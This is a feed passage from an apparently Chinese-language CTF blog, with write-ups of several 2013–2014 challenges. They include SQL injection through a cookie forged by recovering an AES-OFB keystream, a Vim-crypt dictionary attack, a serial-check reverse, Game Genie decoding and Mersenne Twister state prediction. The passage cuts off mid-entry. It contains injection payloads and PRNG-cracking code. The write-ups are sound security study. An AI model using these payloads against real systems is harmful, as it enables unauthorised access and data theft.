&lt;hr&gt;
&lt;p&gt;連到網頁經過檢查以後&lt;br&gt;
會發現存在 &lt;code&gt;index.php~&lt;/code&gt; 這種暫存檔&lt;br&gt;
裡面有著登入的 source code  &lt;/p&gt;
&lt;p&gt;裡面有一行：&lt;br&gt;
&lt;code&gt;$query = "SELECT username FROM users WHERE id='$uid'";&lt;/code&gt;&lt;br&gt;
uid 並沒有做過濾，我們可以做 &lt;strong&gt;SQL injection&lt;/strong&gt;&lt;br&gt;
但是...  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;if(isset($_COOKIE[&amp;#39;uid&amp;#39;])) {
  $uid = openssl_decrypt ($_COOKIE[&amp;#39;uid&amp;#39;], $method, $key, false, $iv);
}
else {
  $uid = generateRandomString(32);
  setcookie(&amp;quot;uid&amp;quot;,openssl_encrypt ($uid, $method, $key, false, $iv));
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;uid 是從 &lt;em&gt;$_COOKIE&lt;/em&gt; 得來&lt;br&gt;
但是被加密過了...&lt;br&gt;
加密的方式是 &lt;code&gt;$method = 'aes-256-ofb';&lt;/code&gt;&lt;br&gt;
到這看似無解了&lt;br&gt;
AES 256 目前還沒有一個很有效率的演算法來破解&lt;br&gt;
但是仔細研究 ofb 這種 stream cipher&lt;br&gt;
&lt;img alt="ofb.png" src="https://ddaa.tw/images/phd_2014_phdays_1.png"&gt;  &lt;/p&gt;
&lt;p&gt;在 key 和 iv 重複使用的情況下&lt;br&gt;
每次 encrypt 出來的 xor key 都會相同&lt;br&gt;
因此只要蒐集到夠多的 cipher&lt;br&gt;
就可以透過&lt;strong&gt;頻率分析&lt;/strong&gt;的方式去解出 xor key  &lt;/p&gt;
&lt;p&gt;由於密文長度只有 32&lt;br&gt;
蒐集的 cookie 其實不用太多 雖然越多會越準確&lt;br&gt;
我後來測試只要蒐集 100 個就足以解出 xor key 了&lt;br&gt;
將 cookie 做 urldecode 再做 base64 解碼&lt;br&gt;
才是正確的 cipher&lt;br&gt;
最後解出的 xor key 是: &lt;code&gt;8fd8392de73d15c49b7188ad91cdcad8cc7978e304d4acd2f336b275b18bcd32&lt;/code&gt;&lt;br&gt;
有了這一串 xor key&lt;br&gt;
我們就可以把 payload 加密成正確的形式&lt;br&gt;
再做 &lt;strong&gt;SQL injection&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;測試一下 &lt;code&gt;' or 1=1 or ''='&lt;/code&gt;&lt;br&gt;
可以成功得到訊息變成 &lt;em&gt;Welcome, admin!&lt;/em&gt;&lt;br&gt;
再做幾個測試&lt;br&gt;
發現存在 &lt;code&gt;password&lt;/code&gt; 欄位&lt;br&gt;
所以把密碼給猜出來應該就是 key 了&lt;br&gt;
先試試長度: &lt;code&gt;' or length(password)=46 or '&lt;/code&gt;&lt;br&gt;
發現密碼共 46 位&lt;br&gt;
接著寫 script 一個一個踹出正確的字元&lt;br&gt;
一開始用的 payload 是 &lt;code&gt;' or mid(password,pos,1)='a' xor'&lt;/code&gt;&lt;br&gt;
但是會大小寫不分...而且不知道為什麼 &lt;em&gt;Y&lt;/em&gt; 測試不出來 = =&lt;br&gt;
CTF 結束後我又試了一下&lt;br&gt;
原來直接用 &lt;code&gt;' or mid(password,1,1)='a&lt;/code&gt;&lt;br&gt;
就可以試出來了 Orz  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;pos 1 is [5]&lt;br&gt;
pos 2 is [0]&lt;br&gt;
pos 3 is [M]&lt;br&gt;
pos 4 is [3]&lt;br&gt;
pos 5 is [7]&lt;br&gt;
pos 6 is [I]&lt;br&gt;
pos 7 is [M]&lt;br&gt;
pos 8 is [3]&lt;br&gt;
...  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;flag: &lt;code&gt;50M37IM35_Y0U_D0_N07_N33D_A_K3Y_70_D3CRYP7_AES&lt;/code&gt;  &lt;/p&gt;</content><category term="Other CTF"></category><category term="SQL Injection"></category><category term="Frequency Analysis"></category></entry><entry><title>GiTs 2014 Crypto 75 Dogecrypt</title><link href="https://ddaa.tw/gits_crypto_75_dogecrypt.html" rel="alternate"></link><published>2014-01-20T23:46:00+08:00</published><updated>2014-01-20T23:46:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-01-20:/gits_crypto_75_dogecrypt.html</id><summary type="html">&lt;p&gt;老實說我覺得這題出滿爛的&lt;br&gt;
害我花最長時間解結果沒解出來&lt;br&gt;
因為最關鍵的資訊是在 IRC 上提示的 ORZ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題給的檔案是一個加密過後的文件&lt;br&gt;
前面的標頭是 &lt;strong&gt;VimCrypt~01!&lt;/strong&gt;&lt;br&gt;
google 以後我才知道原來 &lt;em&gt;vim&lt;/em&gt; 可以用 &lt;code&gt;:X&lt;/code&gt; 或 &lt;code&gt;-x&lt;/code&gt; 加密文件 =.=&lt;br&gt;
加密方式又有分較舊版的 &lt;strong&gt;PKZIP (VimCrypt~01)&lt;/strong&gt; 和新版的 &lt;strong&gt;blowfish (VimCrypt~02)&lt;/strong&gt;&lt;br&gt;
這題是舊版的 &lt;strong&gt;PKZIP&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;一開始 google 尋找解法&lt;br&gt;
發現有人寫了 &lt;strong&gt;vimzipper&lt;/strong&gt;&lt;br&gt;
用途是將加密過的 vim 文件重新包裝成 zip 的格式&lt;br&gt;
包完可以用 &lt;strong&gt;pkcrack&lt;/strong&gt; 或其他破解 zip 的軟體去分析&lt;br&gt;
但是測試後重新封裝的 zip 沒辦法用 brute-force 去得到 key&lt;br&gt;
&lt;strong&gt;pkcrack …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;老實說我覺得這題出滿爛的&lt;br&gt;
害我花最長時間解結果沒解出來&lt;br&gt;
因為最關鍵的資訊是在 IRC 上提示的 ORZ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題給的檔案是一個加密過後的文件&lt;br&gt;
前面的標頭是 &lt;strong&gt;VimCrypt~01!&lt;/strong&gt;&lt;br&gt;
google 以後我才知道原來 &lt;em&gt;vim&lt;/em&gt; 可以用 &lt;code&gt;:X&lt;/code&gt; 或 &lt;code&gt;-x&lt;/code&gt; 加密文件 =.=&lt;br&gt;
加密方式又有分較舊版的 &lt;strong&gt;PKZIP (VimCrypt~01)&lt;/strong&gt; 和新版的 &lt;strong&gt;blowfish (VimCrypt~02)&lt;/strong&gt;&lt;br&gt;
這題是舊版的 &lt;strong&gt;PKZIP&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;一開始 google 尋找解法&lt;br&gt;
發現有人寫了 &lt;strong&gt;vimzipper&lt;/strong&gt;&lt;br&gt;
用途是將加密過的 vim 文件重新包裝成 zip 的格式&lt;br&gt;
包完可以用 &lt;strong&gt;pkcrack&lt;/strong&gt; 或其他破解 zip 的軟體去分析&lt;br&gt;
但是測試後重新封裝的 zip 沒辦法用 brute-force 去得到 key&lt;br&gt;
&lt;strong&gt;pkcrack&lt;/strong&gt; 則需要先知道明文才有辦法分析&lt;br&gt;
在網站上逛來逛去也沒看到 size = 402 byte 的文件&lt;br&gt;
我就卡死在這邊了 ORZ&lt;br&gt;
後來看別人的 write up&lt;br&gt;
才得知原來這題有 hint:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;"Solveable in &amp;lt;5m. Much attack very wamerican-small."&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;wamerican-small&lt;/strong&gt; 是一個字典檔&lt;br&gt;
可以用 &lt;code&gt;apt-get install wamerican-small&lt;/code&gt; 下載安裝&lt;br&gt;
裝完檔案會在 &lt;code&gt;/usr/share/dict/wamerican-small&lt;/code&gt;&lt;br&gt;
於是乎 我們就用字典破解來解這題...&lt;br&gt;
我用 python 開 vim 再踹密碼&lt;br&gt;
大約是一秒一個的速度 = =&lt;br&gt;
五萬多行跑完天都黑了&lt;br&gt;
所以用 &lt;code&gt;split&lt;/code&gt; 把檔案切成 10 個&lt;br&gt;
大概跑一小時就跑出結果了&lt;br&gt;
解出來的密碼是: &lt;em&gt;parliament&lt;/em&gt;&lt;br&gt;
可以用 vim 並輸入密碼開啟原本的檔案&lt;br&gt;
就得到結果了~  &lt;/p&gt;
&lt;p&gt;write up 提供的解法打開 vim source code&lt;br&gt;
用裡面的 function 來 decrypt 文件&lt;br&gt;
過程也是用字典檔下去試&lt;br&gt;
不過用這種做法五分鐘就跑完了 &amp;lt;(_ _)&amp;gt;  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;ShibeSuchDictionaryAttacksWow&lt;/code&gt;  &lt;/p&gt;</content><category term="Other CTF"></category></entry><entry><title>GiTs 2014 Reverse 150 papsmear</title><link href="https://ddaa.tw/gits_reverse_150_papsmear.html" rel="alternate"></link><published>2014-01-20T19:58:00+08:00</published><updated>2014-01-20T19:58:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-01-20:/gits_reverse_150_papsmear.html</id><summary type="html">&lt;p&gt;這題很慢才打開&lt;br&gt;
解出來的時後竟然超過時間了阿阿阿&lt;br&gt;
悲劇 看來還是對 python 不夠熟  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;根據說明用 nc 連至目標後&lt;br&gt;
隨便輸入一些字串&lt;br&gt;
得到錯誤訊息 :  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Serial: asd&lt;br&gt;
Bzzt. Wrong!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;直接打開檔案發現是一個 python 的 code&lt;br&gt;
最後有兩行:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;with open(&amp;#39;flag.txt&amp;#39;,&amp;#39;r&amp;#39;) as f:
    print f.read()
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看來這題的目的很明顯了&lt;br&gt;
需要找出一個正確 Serial 滿足所有條件&lt;br&gt;
Server 就會把 key 給噴出來&lt;br&gt;
剩下的就是 trace code...&lt;br&gt;
首先，程式將 Serial 以 &lt;em&gt;-&lt;/em&gt; 分開 變成 6 個數字&lt;br&gt;
每次取 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這題很慢才打開&lt;br&gt;
解出來的時後竟然超過時間了阿阿阿&lt;br&gt;
悲劇 看來還是對 python 不夠熟  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;根據說明用 nc 連至目標後&lt;br&gt;
隨便輸入一些字串&lt;br&gt;
得到錯誤訊息 :  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Serial: asd&lt;br&gt;
Bzzt. Wrong!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;直接打開檔案發現是一個 python 的 code&lt;br&gt;
最後有兩行:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;with open(&amp;#39;flag.txt&amp;#39;,&amp;#39;r&amp;#39;) as f:
    print f.read()
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看來這題的目的很明顯了&lt;br&gt;
需要找出一個正確 Serial 滿足所有條件&lt;br&gt;
Server 就會把 key 給噴出來&lt;br&gt;
剩下的就是 trace code...&lt;br&gt;
首先，程式將 Serial 以 &lt;em&gt;-&lt;/em&gt; 分開 變成 6 個數字&lt;br&gt;
每次取 1 對數字 &lt;code&gt;(num1, num2)&lt;/code&gt; 做判斷  &lt;/p&gt;
&lt;p&gt;先解釋一下每個函數代表的意思:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;_a()&lt;/code&gt; : 得到數個質數，大小為 2~x ，每次呼叫後都會改變下一次呼叫的值&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__a(n)&lt;/code&gt; : 為 &lt;code&gt;_a()&lt;/code&gt; 所得到的質數做過濾，如果是 n 的因數，則過濾此質數&lt;/li&gt;
&lt;li&gt;&lt;code&gt;___a(n)&lt;/code&gt; : 將 &lt;code&gt;__a()&lt;/code&gt; 過濾後的質數做 (1 - 1.0 / p) 取整數後相乘&lt;/li&gt;
&lt;li&gt;&lt;code&gt;____a(n)&lt;/code&gt; : &lt;code&gt;___(num1 * num2) == ___a(num1) * ___a(num2)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_____a(num1, num2)&lt;/code&gt; : 限制 num1 介於10001~100000，num2 介於100~999&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;程式有幾條限制 任何一條沒滿足都會發生 exception 並結束:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;_____a()&lt;/code&gt; 回傳 True&lt;/li&gt;
&lt;li&gt;&lt;code&gt;___a(num1) == num1 - 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;____a()&lt;/code&gt; 回傳 True&lt;/li&gt;
&lt;li&gt;3個(num1,num2)組合不能相同&lt;/li&gt;
&lt;li&gt;最後一個條件有點複雜，直接看 code&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;for k in range(7,10):
  a,b = int(c.pop()),int(c.pop())
  for x in [a+b*n for n in range(k)]:
    y = [p for p in __a(x)]
    if not (len(y)==1 and y[0]==x):raise
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看似條件很多&lt;br&gt;
但是其實 &lt;em&gt;條件 1&lt;/em&gt; 是限制 input size&lt;br&gt;
&lt;em&gt;條件 3&lt;/em&gt; 很容易滿足&lt;br&gt;
所以暫時不用考慮&lt;br&gt;
我們先找出滿足 &lt;em&gt;條件 2&lt;/em&gt; 的所有 &lt;code&gt;num1&lt;/code&gt;&lt;br&gt;
再用暴力解去找出滿足 &lt;em&gt;條件 5&lt;/em&gt; 的解&lt;br&gt;
最後再用 &lt;em&gt;條件 3&lt;/em&gt; 來檢查是不是正確的解  &lt;/p&gt;
&lt;p&gt;只有三組 k 滿足以上條件&lt;br&gt;
&lt;strong&gt;k = 7 or 8 or 9&lt;/strong&gt; 
分別對應到 3 組 num&lt;br&gt;
有些解是共同的&lt;br&gt;
因為 &lt;em&gt;條件 4&lt;/em&gt; 的限制所以要挑不一樣的解&lt;br&gt;
隨便選一組送過去就拿到key了  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Serial:&lt;br&gt;
10243-420-11003-630-10859-210&lt;br&gt;
The flag is: ThesePrimesAreNotIllegal  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;flag: &lt;code&gt;ThesePrimesAreNotIllegal&lt;/code&gt;  &lt;/p&gt;</content><category term="Other CTF"></category></entry><entry><title>GiTs 2014 Trivia 150 lugkist</title><link href="https://ddaa.tw/gits_trivia_150_lugkist.html" rel="alternate"></link><published>2014-01-20T19:04:00+08:00</published><updated>2014-01-20T19:04:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-01-20:/gits_trivia_150_lugkist.html</id><summary type="html">&lt;p&gt;這次的CTF全名是 : ghost in the shell code&lt;br&gt;
超級長 所以縮寫成 GiTs  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;將xz檔解壓縮以後得到的是一個純文字的文件&lt;br&gt;
前面兩行是 Find the key&lt;br&gt;
後面開始是好幾行的大寫英文字母 每行有六個字  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;GVZSNG
AXZIOG
YNAISG
ASAIUG
....&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;第一時間以為是 &lt;strong&gt;ADFGVX&lt;/strong&gt; 加密&lt;br&gt;
但是仔細看並不是這麼回事&lt;br&gt;
先寫個簡單的小程式來統計出現的字母&lt;br&gt;
發現文中只出現 &lt;strong&gt;AEGIKLNOPSTUVXYZ&lt;/strong&gt;&lt;br&gt;
於是就把這一串拿去 google&lt;br&gt;
找得到的討論串不多&lt;br&gt;
其中一個標題是 &lt;em&gt;SMB1 Game Genie thread of epic winness&lt;/em&gt;&lt;br&gt;
看完討論得知 &lt;strong&gt;AEGIKLNOPSTUVXYZ&lt;/strong&gt; 是某個遊戲機金手指的輸入字元&lt;br&gt;
&lt;img alt="game_genie.png" src="https://ddaa.tw/images/gits_2014_lugkist_1.png"&gt;&lt;/p&gt;
&lt;p&gt;於是以 &lt;strong&gt;Game Genie&lt;/strong&gt; 為關鍵字下去搜尋&lt;br&gt;
得知每一個 &lt;strong&gt;AEGIKLNOPSTUVXYZ&lt;/strong&gt; 的字串&lt;br&gt;
都可以對應到一個 hex …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這次的CTF全名是 : ghost in the shell code&lt;br&gt;
超級長 所以縮寫成 GiTs  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;將xz檔解壓縮以後得到的是一個純文字的文件&lt;br&gt;
前面兩行是 Find the key&lt;br&gt;
後面開始是好幾行的大寫英文字母 每行有六個字  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;GVZSNG
AXZIOG
YNAISG
ASAIUG
....&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;第一時間以為是 &lt;strong&gt;ADFGVX&lt;/strong&gt; 加密&lt;br&gt;
但是仔細看並不是這麼回事&lt;br&gt;
先寫個簡單的小程式來統計出現的字母&lt;br&gt;
發現文中只出現 &lt;strong&gt;AEGIKLNOPSTUVXYZ&lt;/strong&gt;&lt;br&gt;
於是就把這一串拿去 google&lt;br&gt;
找得到的討論串不多&lt;br&gt;
其中一個標題是 &lt;em&gt;SMB1 Game Genie thread of epic winness&lt;/em&gt;&lt;br&gt;
看完討論得知 &lt;strong&gt;AEGIKLNOPSTUVXYZ&lt;/strong&gt; 是某個遊戲機金手指的輸入字元&lt;br&gt;
&lt;img alt="game_genie.png" src="https://ddaa.tw/images/gits_2014_lugkist_1.png"&gt;&lt;/p&gt;
&lt;p&gt;於是以 &lt;strong&gt;Game Genie&lt;/strong&gt; 為關鍵字下去搜尋&lt;br&gt;
得知每一個 &lt;strong&gt;AEGIKLNOPSTUVXYZ&lt;/strong&gt; 的字串&lt;br&gt;
都可以對應到一個 hex address&lt;br&gt;
所以我們要做的事情是&lt;br&gt;
把每一行的 ciphertext 轉換成 hex string  &lt;/p&gt;
&lt;p&gt;理論上應該是要研究他們轉換的算法&lt;br&gt;
不過我不小心 google 到別人寫好的 perl code XD&lt;br&gt;
轉換出來會得到兩段 hex string&lt;br&gt;
前半段是類似 &lt;strong&gt;ddab&lt;/strong&gt; 這種格式&lt;br&gt;
後半段則是一個 ASCII code&lt;br&gt;
用一開始的順序解出來的結果是&lt;br&gt;
&lt;code&gt;d   w P m   a   ?   d   i r c i e l m y w n c a a v p a h s i k v   t s n h t e n c e h o B g s a   o r   e   d e . y o e&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;完全看不出來是三小 XD&lt;br&gt;
所以推測前面的 hex string 應該是用來排序&lt;br&gt;
果然排序後就得到key了&lt;br&gt;
&lt;code&gt;P o w e r   o v e r w h e l m i n g ?   B a c k   i n   m y   d a y   c h e a t s   d i d   n o t   h a v e   s p a c e s .&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;Power overwhelming? Back in my day cheats did not have spaces.&lt;/code&gt;  &lt;/p&gt;</content><category term="Other CTF"></category></entry><entry><title>30C3CTF 2013 Number 100 Guess</title><link href="https://ddaa.tw/30c3ctf_2013_number_100_guess.html" rel="alternate"></link><published>2013-12-30T22:56:00+08:00</published><updated>2013-12-30T22:56:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2013-12-30:/30c3ctf_2013_number_100_guess.html</id><summary type="html">&lt;p&gt;第一次玩的 wargame --- 程式安全的作業1&lt;br&gt;
也是猜數字...不過&lt;br&gt;
這題好難 Orz...  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;先 nc 連過去看看情況  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to this little guessing game!&lt;br&gt;
You have 0/10 right guesses, whats your next guess? 123&lt;br&gt;
Nope, that was wrong, correct would have been 8309891200023509866...&lt;br&gt;
You have 0/10 right guesses, whats your next guess? 456&lt;br&gt;
Nope, that was …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;第一次玩的 wargame --- 程式安全的作業1&lt;br&gt;
也是猜數字...不過&lt;br&gt;
這題好難 Orz...  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;先 nc 連過去看看情況  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to this little guessing game!&lt;br&gt;
You have 0/10 right guesses, whats your next guess? 123&lt;br&gt;
Nope, that was wrong, correct would have been 8309891200023509866...&lt;br&gt;
You have 0/10 right guesses, whats your next guess? 456&lt;br&gt;
Nope, that was wrong, correct would have been 14393411043272556995...&lt;br&gt;
You have 0/10 right guesses, whats your next guess?  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;大概就是要我們猜對 10 次吧&lt;br&gt;
看看程式碼是如何寫的：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;if guess != answer:
  guess_right = 0
  c.sendall(&amp;quot;Nope, that was wrong, correct would have been %s...\n&amp;quot; % answer)
  continue
guess_right += 1
if guess_right &amp;lt; guess_limit:
  c.sendall(&amp;quot;Yes! That was correct, awesome...\n&amp;quot;)
  continue
c.sendall(&amp;quot;You did it! The flag is: %s&amp;quot; % flag)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;結果不只要猜對 10 次 還要連續猜對 10 次 XD&lt;br&gt;
以前作業是用 bof 去 overwrite 判斷的變數&lt;br&gt;
不過 python 是沒有什麼 bof 之類的可以用吧...  &lt;/p&gt;
&lt;p&gt;只好研究一下答案是如何產生的：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;r = random.Random()
r.seed(os.urandom(16))
...
while 1:
  answer = str(r.getrandbits(64)
  ....
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看起來沒有破綻，每次連線 seed 的值都由 &lt;code&gt;os.urandom(16)&lt;/code&gt; 決定&lt;br&gt;
不過在 &lt;strong&gt;連線後&lt;/strong&gt; seed 的值就固定了&lt;br&gt;
當下我是想了幾種做法：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;破解出 &lt;code&gt;os.urandom()&lt;/code&gt; 的算法，知道下次seed之後就可以得知每次產生的answer&lt;/li&gt;
&lt;li&gt;暴力破解試出seed的值，然後就可以推出後面 &lt;code&gt;getrandbits(64)&lt;/code&gt; 的結果&lt;/li&gt;
&lt;li&gt;破解出 &lt;code&gt;getrandbits(64)&lt;/code&gt; 的算法，得到後面 &lt;code&gt;getrandbits(64)&lt;/code&gt; 的結果&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;google一下 &lt;code&gt;os.random()&lt;/code&gt; 的作法，得知是看系統的 &lt;em&gt;/dev/urandom&lt;/em&gt; 是怎麼實作，感覺在遠端是無法破解吧 XD&lt;br&gt;
然後當時不知道哪根筋不對，竟然會覺得 2 是可行的，程式寫完開始 run 就去睡覺&lt;br&gt;
後來想想 seed 的可能性是... 16byte = 2^8^16 = 2^128 &lt;br&gt;
幹...跑到 4012 年都跑不出結果吧 XD&lt;br&gt;
還一度想用平行運算...後來想想 ctf 應該不會出這種需要暴力破解的題目  &lt;/p&gt;
&lt;p&gt;最後考慮方案(3)....開始 google &lt;code&gt;Random.getrandbits()&lt;/code&gt; 的作法&lt;br&gt;
最後找到一篇&lt;br&gt;
[http://jazzy.id.au/default/2010/09/22/cracking_random_number_generators_part_3.html]  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Random.getrandbits()&lt;/code&gt; 是 PRNG (偽隨機數生成器)&lt;br&gt;
所用到的演算法是 &lt;strong&gt;Mersenne Twister&lt;/strong&gt;&lt;br&gt;
MT 會產生 624 個 state
每個 state 代表一個 32 bit 的數字&lt;br&gt;
每一個 state 可以產生出一個 32 bit 的亂數&lt;br&gt;
計算的方式如下：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;int tmp = state[currentIndex];
tmp ^= (tmp &amp;gt;&amp;gt;&amp;gt; 11);
tmp ^= (tmp &amp;lt;&amp;lt; 7) &amp;amp; 0x9d2c5680;
tmp ^= (tmp &amp;lt;&amp;lt; 15) &amp;amp; 0xefc60000;
tmp ^= (tmp &amp;gt;&amp;gt;&amp;gt; 18);
ran_num = tmp
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;624個 state 用完，再計算新的 state value&lt;br&gt;
所以我們接著需要做的是....  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;隨便猜一個數字，並記錄傳回的 answer&lt;/li&gt;
&lt;li&gt;將 answer 拆成前半 a1 和後半 a2，分別是兩次 state 產生出來的亂數&lt;/li&gt;
&lt;li&gt;用 a1, a2 反推出 state 代表的結果 s1, s2&lt;/li&gt;
&lt;li&gt;重複 312 次，共得到 624 個state&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;得到 624 個 state 後，可以產生每個 state 下一次的value  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;int[] state;
for (i = 0; i &amp;lt; 624; i++) {
  int y = (state[i] &amp;amp; 0x80000000) + (state[(i + 1) % 624] &amp;amp; 0x7fffffff);
  int next = y &amp;gt;&amp;gt;&amp;gt; 1;
  next ^= state[(i + 397) % 624];
  if ((y &amp;amp; 1L) == 1L)
    next ^= 0x9908b0df;
  state[i] = next;
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;用新的 state 套上前面計算的方式，就是下次的 answer&lt;br&gt;
&lt;img alt="flag.png" src="https://ddaa.tw/images/30c3CTF_2013_guess_flag.png"&gt;  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;30C3_b9b1579866cccd28b1918302382c9107&lt;/code&gt;&lt;/p&gt;</content><category term="3XC3CTF"></category><category term="PRNG"></category></entry><entry><title>30C3CTF 2013 PWN 100 DOGE1</title><link href="https://ddaa.tw/30c3ctf_2013_pwn_100_doge1.html" rel="alternate"></link><published>2013-12-30T21:25:00+08:00</published><updated>2013-12-30T21:25:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2013-12-30:/30c3ctf_2013_pwn_100_doge1.html</id><summary type="html">&lt;p&gt;這次都沒有人陪打 QQ&lt;br&gt;
只解兩題 100 分...真慘&lt;br&gt;
不過這題 100 分，跟另一題的難度也差太多了吧 = =  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;先用 nc 連線過去，要求我們輸入名稱，然後就看到一隻...豬頭?&lt;br&gt;
提示有兩個指令好用: &lt;code&gt;feed&lt;/code&gt;, &lt;code&gt;show&lt;/code&gt;&lt;br&gt;
&lt;code&gt;show&lt;/code&gt; 是再印一次豬頭，&lt;code&gt;feed&lt;/code&gt; 也差不多，奇怪的功能 = =&lt;br&gt;
&lt;img alt="doge1.png" src="https://ddaa.tw/images/30c3CTF_2013_doge_1.png"&gt;  &lt;/p&gt;
&lt;p&gt;假如不輸入 &lt;code&gt;feed&lt;/code&gt; 或 &lt;code&gt;show&lt;/code&gt;，試著輸入長字串，毫無反應 Orz&lt;br&gt;
試試看輸入超長名稱....沒有印出那顆豬頭了 XD  &lt;/p&gt;
&lt;p&gt;這題有提供原始程式，資料夾底下有三個檔案:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ascii_art_doge_color.txt&lt;/li&gt;
&lt;li&gt;doge.so&lt;/li&gt;
&lt;li&gt;run.py&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;ascii_art_doge_color.txt&lt;/em&gt; 就是那隻豬頭的 ascii 圖檔&lt;br&gt;
&lt;em&gt;run.py&lt;/em&gt; 只有 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這次都沒有人陪打 QQ&lt;br&gt;
只解兩題 100 分...真慘&lt;br&gt;
不過這題 100 分，跟另一題的難度也差太多了吧 = =  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;先用 nc 連線過去，要求我們輸入名稱，然後就看到一隻...豬頭?&lt;br&gt;
提示有兩個指令好用: &lt;code&gt;feed&lt;/code&gt;, &lt;code&gt;show&lt;/code&gt;&lt;br&gt;
&lt;code&gt;show&lt;/code&gt; 是再印一次豬頭，&lt;code&gt;feed&lt;/code&gt; 也差不多，奇怪的功能 = =&lt;br&gt;
&lt;img alt="doge1.png" src="https://ddaa.tw/images/30c3CTF_2013_doge_1.png"&gt;  &lt;/p&gt;
&lt;p&gt;假如不輸入 &lt;code&gt;feed&lt;/code&gt; 或 &lt;code&gt;show&lt;/code&gt;，試著輸入長字串，毫無反應 Orz&lt;br&gt;
試試看輸入超長名稱....沒有印出那顆豬頭了 XD  &lt;/p&gt;
&lt;p&gt;這題有提供原始程式，資料夾底下有三個檔案:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ascii_art_doge_color.txt&lt;/li&gt;
&lt;li&gt;doge.so&lt;/li&gt;
&lt;li&gt;run.py&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;ascii_art_doge_color.txt&lt;/em&gt; 就是那隻豬頭的 ascii 圖檔&lt;br&gt;
&lt;em&gt;run.py&lt;/em&gt; 只有：  &lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3
4
